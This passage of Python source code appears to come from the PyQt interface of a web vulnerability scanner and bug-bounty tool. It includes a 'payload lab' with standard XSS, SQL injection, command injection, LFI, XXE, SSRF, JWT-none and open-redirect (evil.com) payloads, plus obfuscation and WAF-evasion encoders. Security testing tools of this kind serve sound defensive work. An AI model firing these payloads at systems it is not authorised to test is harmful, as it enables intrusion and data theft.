        features_layout.addWidget(self.smart_fuzz_cb)

        self.evasion_cb = AnimatedCheckBox("WAF evasion techniques")
        self.evasion_cb.setChecked(self.config.get("evasion", True))
        features_layout.addWidget(self.evasion_cb)

        features_group.setLayout(features_layout)
        layout.addWidget(features_group)
        # Authentication
        auth_group = QGroupBox("🔐 AUTHENTICATION")
        auth_layout = QFormLayout()

        auth_cfg = self.config.get("auth", {}) if isinstance(self.config.get("auth", {}), dict) else {}

        self.auth_enabled = AnimatedCheckBox("Enable authentication")
        self.auth_enabled.setChecked(bool(auth_cfg.get("enabled", False)))
        auth_layout.addRow("", self.auth_enabled)

        self.auth_cookie = QLineEdit()
        self.auth_cookie.setPlaceholderText("sessionid=...; csrftoken=... (optional)")
        self.auth_cookie.setText(str(auth_cfg.get("cookie", "")))
        auth_layout.addRow("Cookie:", self.auth_cookie)

        self.auth_bearer = QLineEdit()
        self.auth_bearer.setPlaceholderText("Bearer token (token only, no 'Bearer ' prefix)")
        self.auth_bearer.setText(str(auth_cfg.get("bearer_token", "")))
        auth_layout.addRow("Bearer Token:", self.auth_bearer)

        self.auth_login_url = QLineEdit()
        self.auth_login_url.setPlaceholderText("https://target.tld/login (optional)")
        self.auth_login_url.setText(str(auth_cfg.get("login_url", "")))
        auth_layout.addRow("Login URL:", self.auth_login_url)

        self.auth_username = QLineEdit()
        self.auth_username.setPlaceholderText("username/email")
        self.auth_username.setText(str(auth_cfg.get("username", "")))
        auth_layout.addRow("Username:", self.auth_username)

        self.auth_password = QLineEdit()
        self.auth_password.setEchoMode(QLineEdit.Password)
        self.auth_password.setPlaceholderText("password")
        self.auth_password.setText(str(auth_cfg.get("password", "")))
        auth_layout.addRow("Password:", self.auth_password)

        self.auth_user_field = QLineEdit()
        self.auth_user_field.setPlaceholderText("username field name (optional)")
        self.auth_user_field.setText(str(auth_cfg.get("username_field", "")))
        auth_layout.addRow("User Field:", self.auth_user_field)

        self.auth_pass_field = QLineEdit()
        self.auth_pass_field.setPlaceholderText("password field name (optional)")
        self.auth_pass_field.setText(str(auth_cfg.get("password_field", "")))
        auth_layout.addRow("Pass Field:", self.auth_pass_field)

        auth_group.setLayout(auth_layout)
        layout.addWidget(auth_group)


        # Save button
        self.save_settings = NeonButton("💾 SAVE SETTINGS")
        self.save_settings.setMinimumHeight(50)
        self.save_settings.clicked.connect(self._save_config)
        layout.addWidget(self.save_settings)

        scroll.setWidget(container)
        self.tabs.addTab(scroll, "⚙️ SETTINGS")

    def _apply_theme(self):
        """Apply the selected theme"""
        # Smaller, consistent UI (override in config.json: "ui_font_size": 10)
        try:
            app = QApplication.instance()
            if app:
                app.setFont(QFont("Segoe UI", int(self.config.get("ui_font_size", 10))))
        except Exception:
            pass
        theme = self.config.get("theme", "neon")
        if theme == "neon":
            self.setPalette(NeonStyles.get_neon_palette())
            self.setStyleSheet(NeonStyles.get_neon_stylesheet())
            self.matrix_rain.hide()
            self.particle_bg.show()
        elif theme == "cyberpunk":
            self.setPalette(CyberStyles.get_cyberpunk_palette())
            self.setStyleSheet(CyberStyles.get_cyberpunk_stylesheet())
            self.matrix_rain.hide()
            self.particle_bg.show()
        elif theme == "matrix":
            self.setPalette(MatrixStyles.get_matrix_palette())
            self.setStyleSheet(MatrixStyles.get_matrix_stylesheet())
            self.matrix_rain.show()
            self.particle_bg.hide()
        elif theme == "dark":
            self.setPalette(NeonStyles.get_dark_palette())
            self.setStyleSheet("")
            self.matrix_rain.hide()
            self.particle_bg.hide()
        elif theme == "color_blind":
            self.setPalette(NeonStyles.get_color_blind_palette())
            self.setStyleSheet("")
            self.matrix_rain.hide()
            self.particle_bg.hide()

    def _setup_connections(self):
        """Setup signal/slot connections"""
        self.scan_button.clicked.connect(self._start_scan)
        self.stop_button.clicked.connect(self._stop_scan)
        self.pause_button.clicked.connect(self._pause_scan)
        self.save_settings.clicked.connect(self._save_config)
        self.theme_combo.currentTextChanged.connect(self._change_theme)
        self.blind_xss_thread.callback_received.connect(self._add_blind_xss_callback)

    def _setup_animations(self):
        """Setup animations"""
        # Logo rotation animation
        self.logo_animation = QPropertyAnimation(self.logo_label, b"geometry")
        self.logo_animation.setDuration(2000)
        self.logo_animation.setLoopCount(-1)
        self.logo_animation.setEasingCurve(QEasingCurve.InOutQuad)
        
        # Status updates
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self._update_status)
        self.status_timer.start(3000)

    def _update_status(self):
        """Update status message randomly"""
        statuses = [
            "CHOMBEZA is hunting...",
            "Scanning for vulnerabilities...",
            "Checking for exploits...",
            "Analyzing attack surface...",
            "Fuzzing parameters...",
            "Testing payloads..."
        ]
        if self.scan_button.isEnabled():
            self.status_label.setText(random.choice(statuses))

    def toggle_fullscreen(self):
        """Toggle fullscreen mode"""
        if self.is_maximized:
            self.showNormal()
            self.is_maximized = False
            self.fullscreen_btn.setText("⛶")
        else:
            self.showMaximized()
            self.is_maximized = True
            self.fullscreen_btn.setText("✕")

    def eventFilter(self, obj, event):
        """Handle resize events"""
        if event.type() == event.Resize:
            # Update background effects on resize
            self.matrix_rain.setGeometry(self.rect())
            self.particle_bg.setGeometry(self.rect())
        return super().eventFilter(obj, event)

    def resizeEvent(self, event):
        """Handle widget resizing"""
        super().resizeEvent(event)
        
        # Update tab contents
        for i in range(self.tabs.count()):
            widget = self.tabs.widget(i)
            if isinstance(widget, QScrollArea):
                widget.widget().adjustSize()

    def _start_scan(self):
        """Start the scan"""
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target URL")
            return

        # FIXED: Get actual scan type from mapping
        display_type = self.scan_type_combo.currentText()
        scan_type = self.scan_types.get(display_type, "quick")
        
        self.scanner.set_target(target)
        self.scanner.set_scan_type(scan_type)

        # Update enabled vulnerabilities
        features = {}
        for vuln, cb in self.vuln_checkboxes.items():
            features[vuln.lower().replace(" ", "_")] = cb.isChecked()
        self.config["features"] = features
        
        # Update other settings
        self.config["threads"] = self.threads_spin.value()
        self.config["delay"] = self.delay_spin.value()
        self.config["timeout"] = self.timeout_spin.value()
        # Authentication settings
        self.config["auth"] = {
            "enabled": bool(getattr(self, "auth_enabled", None).isChecked()) if hasattr(self, "auth_enabled") else False,
            "cookie": getattr(self, "auth_cookie", None).text().strip() if hasattr(self, "auth_cookie") else "",
            "bearer_token": getattr(self, "auth_bearer", None).text().strip() if hasattr(self, "auth_bearer") else "",
            "login_url": getattr(self, "auth_login_url", None).text().strip() if hasattr(self, "auth_login_url") else "",
            "username": getattr(self, "auth_username", None).text().strip() if hasattr(self, "auth_username") else "",
            "password": getattr(self, "auth_password", None).text().strip() if hasattr(self, "auth_password") else "",
            "username_field": getattr(self, "auth_user_field", None).text().strip() if hasattr(self, "auth_user_field") else "",
            "password_field": getattr(self, "auth_pass_field", None).text().strip() if hasattr(self, "auth_pass_field") else "",
        }


        # Apply runtime config to scanner (so checkbox selections take effect immediately)
        try:
            if getattr(self, "scanner", None):
                # Merge top-level config and features
                self.scanner.config.update(self.config)
                self.scanner.config["features"] = features
                self.scanner.config["threads"] = self.config.get("threads", self.scanner.config.get("threads", 10))
                self.scanner.config["delay"] = self.config.get("delay", self.scanner.config.get("delay", 100))
                self.scanner.config["timeout"] = self.config.get("timeout", self.scanner.config.get("timeout", 10))
                # Screenshot toggle from UI if present
                if hasattr(self, "screenshot_cb"):
                    self.scanner.config["screenshot"] = bool(self.screenshot_cb.isChecked())
        except Exception as e:
            logger.warning(f"Failed to apply UI config to scanner: {e}")

        # Persist config to disk
        with open("config.json", "w") as f:
            json.dump(self.config, f, indent=2)


        # Clean up previous thread if exists
        if self.scanner_thread and self.scanner_thread.isRunning():
            self._stop_scan()
            self.scanner_thread.quit()
            self.scanner_thread.wait(2000)

        # Setup scanner thread
        self.scanner_thread = QThread()
        self.scanner_worker = ScannerThread(self.scanner)
        self.scanner_worker.moveToThread(self.scanner_thread)

        # Connect signals
        self.scanner_worker.update_progress.connect(self.progress.setValue)
        self.scanner_worker.update_log.connect(self.console.append_log)
        self.scanner_worker.scan_finished.connect(self._scan_finished)
        self.scanner_worker.vulnerability_found.connect(self._add_vulnerability)
        self.scanner_worker.update_status.connect(self.status_label.setText)

        # Connect thread lifecycle
        self.scanner_thread.started.connect(self.scanner_worker.run_scan)
        self.scanner_thread.finished.connect(self._cleanup_thread)

        self.scanner_thread.start()

        # Update UI state
        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.pause_button.setEnabled(True)
        self.progress.setValue(0)
        self.vuln_tree.clear()
        self.console.clear()
        
        # Reset stats
        for key in self.stats_labels:
            self.stats_labels[key].setText("0")
        
        self.console.append_log(f"⚡ CHOMBEZA starting {scan_type} scan on {target}...")

    def _cleanup_thread(self):
        """Clean up thread resources"""
        if self.scanner_worker:
            self.scanner_worker.deleteLater()
            self.scanner_worker = None
        if self.scanner_thread:
            self.scanner_thread.deleteLater()
            self.scanner_thread = None

    def _stop_scan(self):
        """Stop the current scan"""
        if self.scanner_worker:
            self.scanner_worker.stop_scan()
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.quit()
            self.scanner_thread.wait(2000)
        
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.pause_button.setEnabled(False)

    def _pause_scan(self):
        """Pause or resume the scan"""
        if self.pause_button.text() == "⏸ PAUSE":
            self.pause_button.setText("▶ RESUME")
            if self.scanner_worker:
                self.scanner_worker.running = False
        else:
            self.pause_button.setText("⏸ PAUSE")
            if self.scanner_worker:
                self.scanner_worker.running = True

    def _scan_finished(self, report):
        """Handle scan completion"""
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.pause_button.setEnabled(False)
        self.progress.setValue(100)

        # Update stats
        for key, label in self.stats_labels.items():
            label.setText(str(self.scanner.stats.get(key, 0)))

        # Update vulnerability tree
        self.vuln_tree.clear()
        for vuln in self.scanner.vulnerabilities:
            item = QTreeWidgetItem([
                vuln.severity.capitalize(),
                vuln.name,
                vuln.url,
                getattr(vuln, 'parameter', 'N/A'),
                f"{getattr(vuln, 'confidence', 100)}%"
            ])
            
            # Color by severity
            colors = {
                "critical": QColor(255, 0, 0),
                "high": QColor(255, 100, 0),
                "medium": QColor(255, 200, 0),
                "low": QColor(0, 255, 0),
                "info": QColor(0, 162, 255)
            }
            color = colors.get(vuln.severity, QColor(255, 255, 255))
            for i in range(5):
                item.setForeground(i, color)
            
            self.vuln_tree.addTopLevelItem(item)

        # Show summary
        summary = self.scanner._generate_summary()
        self.console.append_log(f"✅ Scan completed! {summary}")
        self.status_label.setText(f"Scan completed: {self.scanner.stats['total']} vulnerabilities found")

        # Auto-save
        if self.config.get("auto_save", True):
            self._export_report("json")

        # Show notification
        if self.scanner.stats.get("critical", 0) > 0:
            QMessageBox.critical(self, "Critical Findings", 
                               f"Found {self.scanner.stats['critical']} critical vulnerabilities!")

        # Clean up thread
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.quit()
            self.scanner_thread.wait(2000)

    def _add_vulnerability(self, vuln_data):
        """Add vulnerability to UI in real-time"""
        self.console.append_log(f"🔥 Found {vuln_data['severity']} vulnerability: {vuln_data['name']} at {vuln_data['url']}")
        
        # Update stats in real-time
        for key, label in self.stats_labels.items():
            if key in self.scanner.stats:
                label.setText(str(self.scanner.stats[key]))

    def _show_vuln_details(self):
        """Show vulnerability details"""
        selected = self.vuln_tree.selectedItems()
        if not selected:
            return

        item = selected[0]
        vuln_name = item.text(1)
        vuln_url = item.text(2)

        vuln = next((v for v in self.scanner.vulnerabilities 
                    if v.name == vuln_name and v.url == vuln_url), None)
        if vuln:
            # Get parameter and confidence safely
            parameter = getattr(vuln, 'parameter', 'N/A')
            confidence = getattr(vuln, 'confidence', 100)
            
            severity_color = '#ff0000' if vuln.severity == 'critical' else '#ff5e00'
            
            details = f"""
            <style>
                body {{ 
                    font-family: 'Courier New', monospace; 
                    background: #0a0a0a; 
                    color: #00ff00; 
                    margin: 10px;
                }}
                h2 {{ 
                    color: {severity_color};
                    border-bottom: 2px solid {severity_color};
                    padding-bottom: 5px;
                }}
                .section {{
                    margin: 15px 0;
                }}
                .label {{
                    color: #00a2ff;
                    font-weight: bold;
                    font-size: 14px;
                }}
                .evidence {{ 
                    background: #1a1a1a; 
                    padding: 10px; 
                    border-left: 3px solid #00ff00;
                    font-family: 'Courier New';
                    white-space: pre-wrap;
                    margin: 5px 0;
                }}
                .recommendation {{ 
                    background: #002200; 
                    padding: 10px; 
                    border-left: 3px solid #00ff00;
                    margin: 5px 0;
                }}
                a {{
                    color: #00a2ff;
                    text-decoration: none;
                }}
                a:hover {{
                    text-decoration: underline;
                }}
            </style>
            
            <h2>{vuln.name} <span style="color: {severity_color};">({vuln.severity.upper()})</span></h2>
            
            <div class="section">
                <span class="label">🎯 URL:</span><br>
                <a href="{vuln.url}" target="_blank">{vuln.url}</a>
            </div>
            
            <div class="section">
                <span class="label">📌 Parameter:</span><br>
                {parameter}
            </div>
            
            <div class="section">
                <span class="label">📊 Confidence:</span><br>
                {confidence}%
            </div>
            
            <div class="section">
                <span class="label">📝 Description:</span><br>
                {vuln.description}
            </div>
            
            <div class="section">
                <span class="label">🔍 Evidence:</span>
                <div class="evidence"><pre>{vuln.evidence}</pre></div>
            </div>
            
            <div class="section">
                <span class="label">💡 Recommendation:</span>
                <div class="recommendation"><pre>{vuln.recommendation}</pre></div>
            </div>
            """
            
            if hasattr(vuln, 'screenshot') and vuln.screenshot:
                details += f'''
                <div class="section">
                    <span class="label">📸 Screenshot:</span><br>
                    <img src="data:image/png;base64,{vuln.screenshot}" width="600" style="border: 2px solid #00ff00; border-radius: 5px;">
                </div>
                '''
            
            if hasattr(vuln, 'request_response') and vuln.request_response:
                details += f'''
                <div class="section">
                    <span class="label">📨 Request/Response:</span>
                    <div class="evidence"><pre>{vuln.request_response}</pre></div>
                </div>
                '''
            
            self.vuln_details.setHtml(details)

    def _filter_vuln_tree(self, severity):
        """Filter vulnerability tree by severity"""
        if severity == "All":
            for i in range(self.vuln_tree.topLevelItemCount()):
                self.vuln_tree.topLevelItem(i).setHidden(False)
        else:
            for i in range(self.vuln_tree.topLevelItemCount()):
                item = self.vuln_tree.topLevelItem(i)
                item.setHidden(item.text(0).lower() != severity.lower())

    def _export_report(self, format):
        """Export report in specified format"""
        if not hasattr(self.scanner, "vulnerabilities") or not self.scanner.vulnerabilities:
            QMessageBox.warning(self, "Error", "No scan results to export")
            return

        report = self.scanner.generate_report()
        path = report.get(format)
        if path:
            QMessageBox.information(self, "Success", f"Report saved to {path}")
        else:
            QMessageBox.warning(self, "Error", f"Failed to generate {format} report")

    def _save_config(self):
        """Save configuration to file"""
        self.config["concurrency"] = self.concurrency_spin.value()
        self.config["rate_limit"] = self.rate_spin.value()
        self.config["proxy"] = self.proxy_input.text()
        self.config["user_agent"] = self.user_agent_input.text()
        self.config["timeout"] = self.timeout_spin_adv.value()
        self.config["retries"] = self.retries_spin.value()
        self.config["max_redirects"] = self.max_redirects.value()
        self.config["follow_redirects"] = self.follow_redirects.isChecked()
        self.config["verify_ssl"] = self.verify_ssl.isChecked()
        self.config["auto_save"] = self.auto_save_cb.isChecked()
        self.config["screenshot"] = self.screenshot_cb.isChecked()
        self.config["smart_fuzz"] = self.smart_fuzz_cb.isChecked()
        self.config["evasion"] = self.evasion_cb.isChecked()

        with open("config.json", 'w') as f:
            json.dump(self.config, f, indent=2)

        QMessageBox.information(self, "Success", "Settings saved!")

    def _change_theme(self, theme):
        """Change UI theme"""
        theme_map = {
            "Neon Glow": "neon",
            "Cyberpunk": "cyberpunk",
            "Matrix": "matrix",
            "Dark Mode": "dark",
            "Color Blind": "color_blind"
        }
        self.config["theme"] = theme_map.get(theme, "neon")
        self._apply_theme()
        
        # Save theme preference
        with open("config.json", 'w') as f:
            json.dump(self.config, f, indent=2)

    def _add_blind_xss_callback(self, callback):
        """Add blind XSS callback to list"""
        item = QListWidgetItem(f"🔔 {callback['time']} - {callback['ip']} - {callback.get('user_agent', 'Unknown')[:50]}")
        item.setData(Qt.UserRole, callback)
        self.blind_xss_list.addItem(item)
        self.console.append_log(f"🎯 Blind XSS callback from {callback['ip']}")
        
        # Flash indicator
        self.blind_xss_indicator.setStyleSheet("color: #ff0000;")
        QTimer.singleShot(1000, lambda: self.blind_xss_indicator.setStyleSheet("color: #00ff00;"))

    def _show_blind_xss_details(self, item):
        """Show blind XSS callback details"""
        callback = item.data(Qt.UserRole)
        if callback:
            details = f"""
            <style>
                body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }}
                table {{ border-collapse: collapse; width: 100%; }}
                td {{ padding: 5px; border: 1px solid #005500; }}
                .key {{ color: #00a2ff; font-weight: bold; }}
            </style>
            
            <h2>🎯 Blind XSS Callback</h2>
            
            <table>
                <tr><td class="key">Time:</td><td>{callback['time']}</td></tr>
                <tr><td class="key">IP Address:</td><td>{callback['ip']}</td></tr>
                <tr><td class="key">Method:</td><td>{callback['method']}</td></tr>
                <tr><td class="key">URL:</td><td>{callback['url']}</td></tr>
            </table>
            
            <h3>Headers:</h3>
            <pre>{json.dumps(callback['headers'], indent=2)}</pre>
            
            <h3>Query Parameters:</h3>
            <pre>{json.dumps(callback.get('query', {}), indent=2)}</pre>
            
            <h3>Form Data:</h3>
            <pre>{json.dumps(callback.get('form', {}), indent=2)}</pre>
            
            <h3>Raw Data:</h3>
            <pre>{callback.get('data', '')}</pre>
            """
            
            if callback.get('json'):
                details += f"<h3>JSON:</h3><pre>{json.dumps(callback['json'], indent=2)}</pre>"
            
            self.blind_xss_details.setHtml(details)

    def _restart_blind_xss(self):
        """Restart blind XSS server"""
        self.blind_xss_thread.stop()
        time.sleep(1)
        self.blind_xss_server = BlindXSSServer(self.config.get("blind_xss_port", 5000))
        self.blind_xss_thread = BlindXSSThread(self.blind_xss_server)
        self.blind_xss_thread.callback_received.connect(self._add_blind_xss_callback)
        self.blind_xss_thread.start()
        self.console.append_log("🔄 Blind XSS server restarted")

    def _clear_blind_xss(self):
        """Clear blind XSS callbacks"""
        self.blind_xss_list.clear()
        self.blind_xss_server.clear_callbacks()
        self.console.append_log("🗑️ Blind XSS callbacks cleared")

    def _clear_console(self):
        """Clear console output"""
        self.console.clear()

    def _generate_payload(self):
        """Generate payload in payload lab"""
        payload_type = self.payload_type_combo.currentText().lower()
        
        # Get base payloads
        base_payloads = {
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            "sqli": ["' OR '1'='1", "1' UNION SELECT 1,2,3--", "1' AND SLEEP(5)--"],
            "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
            "lfi": ["../../../../etc/passwd", "....//....//etc/passwd"],
            "rce": [";id", "|id", "`id`", "$(id)"],
            "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"],
            "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080"],
            "jwt": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."],
            "open_redirect": ["//evil.com", "https://evil.com"],
            "crlf": ["%0d%0aSet-Cookie: session=hacked"],
            "prototype_pollution": ["__proto__[admin]=true", "constructor.prototype.admin=true"],
            "deserialization": ["O:8:\"stdClass\":0:{}", "a:2:{i:0;s:4:\"test\";}"],
            "ldap_injection": ["*)(uid=*", "admin*)(userPassword=*"],
            "nosqli": ["[$ne]=1", "{\"$gt\":\"\"}"],
            "xpath_injection": ["' or '1'='1", "'] | //* | //*['"],
            "command_injection": ["; ls", "| ls", "`ls`", "$(ls)"]
        }
        
        base = random.choice(base_payloads.get(payload_type, ["test"]))
        
        # Apply obfuscation
        obfuscated = base
        for key, cb in self.obfuscation_options.items():
            if cb.isChecked():
                obfuscated = self._apply_obfuscation(obfuscated, key)
        
        # Apply encryption
        for key, rb in self.encryption_options.items():
            if rb.isChecked():
                obfuscated = self._apply_encryption(obfuscated, key)
                break
        
        self.payload_list.addItem(obfuscated)
        
        # Update payload count
        count = self.payload_list.count()
        self.payload_count_label.setText(f"Total Payloads: {count}")
        
        # Auto-scroll to new item
        self.payload_list.scrollToBottom()
        
        # Limit history to prevent lag
        self._limit_payload_history(100)

    def _apply_obfuscation(self, payload, technique):
        """Apply obfuscation technique to payload"""
        if technique == "base64":
            import base64
            return f"<script>eval(atob('{base64.b64encode(payload.encode()).decode()}'))</script>"
        elif technique == "hex":
            hex_payload = ''.join([hex(ord(c))[2:] for c in payload])
            return f"<script>eval('{hex_payload}'.replace(/../g, '%'))</script>"
        elif technique == "unicode":
            unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in payload])
            return f"<script>eval('{unicode_payload}')</script>"
        elif technique == "html":
            html_payload = ''.join([f'&#{ord(c)};' for c in payload])
            return f"<script>document.write('{html_payload}')</script>"
        elif technique == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif technique == "double_url":
            import urllib.parse
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif technique == "jsfuck":
            return f"<script>eval([{','.join([str(ord(c)) for c in payload])}].map(String.fromCharCode).join(''))</script>"
        elif technique == "fromcharcode":
            return f"<script>eval(String.fromCharCode({','.join([str(ord(c)) for c in payload])}))</script>"
        elif technique == "eval":
            import base64
            return f"<script>eval(atob('{base64.b64encode(payload.encode()).decode()}'))</script>"
        elif technique == "function":
            import base64
            return f"<script>[].constructor.constructor(atob('{base64.b64encode(payload.encode()).decode()}'))()</script>"
        elif technique == "mixed_case":
            return ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif technique == "comments":
            parts = list(payload)
            result = []
            for c in parts:
                result.append(c)
                if random.random() > 0.7:
                    result.append(f"/*{random.randint(1000,9999)}*/")
            return ''.join(result)
        elif technique == "nullbytes":
            return payload.replace("", "%00")
        elif technique == "linebreaks":
            return payload.replace("", "\n")
        elif technique == "tabs":
            return payload.replace("", "\t")
        return payload

    def _apply_encryption(self, payload, technique):
        """Apply encryption to payload"""
        if technique == "aes":
            try:
                from Crypto.Cipher import AES
                import base64
                key = b'16bytekeyforaes!'
                cipher = AES.new(key, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(payload.encode())
                encrypted = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
                return f"<script>// AES encrypted: {encrypted}</script>"
            except:
                return payload
        elif technique == "rc4":
            try:
                from Crypto.Cipher import ARC4
                import base64
                key = b'rc4key'
                cipher = ARC4.new(key)
                encrypted = base64.b64encode(cipher.encrypt(payload.encode())).decode()
                return f"<script>// RC4 encrypted: {encrypted}</script>"
            except:
                return payload
        elif technique == "xor":
            key = 0x42
            encrypted = ''.join([chr(ord(c) ^ key) for c in payload])
            return f"<script>eval(String.fromCharCode({','.join([str(ord(c)) for c in encrypted])}))</script>"
        elif technique == "rot13":
            import codecs
            return codecs.encode(payload, 'rot_13')
        elif technique == "caesar":
            shift = 3
            encrypted = ''.join([chr((ord(c) + shift) % 128) for c in payload])
            return encrypted
        elif technique == "base64_xor":
            import base64
            key = 0x42
            encrypted = base64.b64encode(''.join([chr(ord(c) ^ key) for c in payload]).encode()).decode()
            return f"<script>eval(atob('{encrypted}'))</script>"
        return payload

    def _copy_payload(self):
        """Copy selected payload to clipboard"""
        current = self.payload_list.currentItem()
        if current:
            clipboard = QApplication.clipboard()
            clipboard.setText(current.text())
            self.console.append_log("📋 Payload copied to clipboard")

    def _test_payload(self):
        """Test selected payload in current scan"""
        current = self.payload_list.currentItem()
        if current:
            payload = current.text()
            self.target_input.setText(self.target_input.text() + "?test=" + payload)
            self.tabs.setCurrentIndex(0)  # Switch to scan tab
            self.console.append_log(f"🎯 Testing payload: {payload[:50]}...")

    def _save_payload(self):
        """Save payload to database"""
        current = self.payload_list.currentItem()
        if current:
            payload_type = self.payload_type_combo.currentText().lower()
            self.scanner.payload_db.add_payload(payload_type, current.text())
            self.console.append_log(f"💾 Payload saved to {payload_type} database")

    def _clear_payloads(self):
        """Clear all generated payloads with confirmation"""
        if self.payload_list.count() == 0:
            return
            
        reply = QMessageBox.question(
            self, 
            "Clear Payloads", 
            f"Are you sure you want to clear all {self.payload_list.count()} generated payloads?",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.payload_list.clear()
            self.payload_count_label.setText("Total Payloads: 0")
            self.console.append_log("🗑️ All generated payloads cleared")

    def _limit_payload_history(self, max_items=100):
        """Limit the number of payloads in history to prevent UI lag"""
        if self.payload_list.count() > max_items:
            # Remove oldest items
            for i in range(self.payload_list.count() - max_items):
                self.payload_list.takeItem(0)
            
            self.console.append_log(f"⚠️ Payload history limited to {max_items} items")

    def _setup_traffic_monitoring(self):
        """Setup live traffic monitoring"""
        try:
            from core.scanner import traffic_monitor
            from ui.live_traffic_window import LiveTrafficWindow

            # Lazy-create window only when user clicks
            self.traffic_window = None
            self._LiveTrafficWindowClass = LiveTrafficWindow

            # Add to view menu
            view_menu = self.menuBar().addMenu("View")
            show_traffic_action = QAction("Show Live Traffic", self)
            show_traffic_action.triggered.connect(self._show_traffic_window)
            view_menu.addAction(show_traffic_action)

            # Also add a status bar button
            self.traffic_btn = QPushButton("📊 Live Traffic")
            self.traffic_btn.clicked.connect(self._show_traffic_window)
            self.traffic_btn.setFixedSize(120, 30)
            self.traffic_btn.setStyleSheet("""
                QPushButton {
                    background: #1a1a1a;
                    color: #00ff00;
                    border: 2px solid #00ff00;
                    border-radius: 5px;
                    font-weight: bold;
                }
                QPushButton:hover {
                    background: #003300;
                }
            """)

            self.status_bar.addPermanentWidget(self.traffic_btn)

            logger.info("Live traffic monitoring initialized (lazy)")
            print("[+] Live traffic monitoring initialized (lazy)")  # Debug

            
        except Exception as e:
            logger.error(f"Failed to setup traffic monitoring: {e}")
            import traceback
            logger.debug(traceback.format_exc())
            print(f"[-] Failed to setup traffic monitoring: {e}")  # Debug

    def _show_traffic_window(self):
        """Show the live traffic window"""
        try:
            if self.traffic_window is None:
                # Create on first open
                cls = getattr(self, '_LiveTrafficWindowClass', None)
                if cls is None:
                    from ui.live_traffic_window import LiveTrafficWindow
                    cls = LiveTrafficWindow
                self.traffic_window = cls(parent=self)
            self.traffic_window.show()
            self.traffic_window.raise_()
            self.traffic_window.activateWindow()
            self.status_bar.showMessage("Live traffic window opened", 3000)
        except Exception as e:
            QMessageBox.warning(self, 'Error', f'Failed to open live traffic window: {e}')
            logger.error(f'Failed to open live traffic window: {e}', exc_info=True)

    def closeEvent(self, event):
        """Handle window close event"""
        logger.info("Shutting down CHOMBEZA...")
        
        # Stop blind XSS thread
        if hasattr(self, 'blind_xss_thread'):
            self.blind_xss_thread.stop()
        
        # Stop scan thread
        if hasattr(self, 'scanner_thread') and self.scanner_thread and self.scanner_thread.isRunning():
            if hasattr(self, 'scanner_worker') and self.scanner_worker:
                self.scanner_worker.stop_scan()
            self.scanner_thread.quit()
            self.scanner_thread.wait(3000)
        
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application attributes
    app.setStyle('Fusion')
    app.setApplicationName("CHOMBEZA Bug Bounty Pro")
    app.setApplicationVersion("2.0")
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())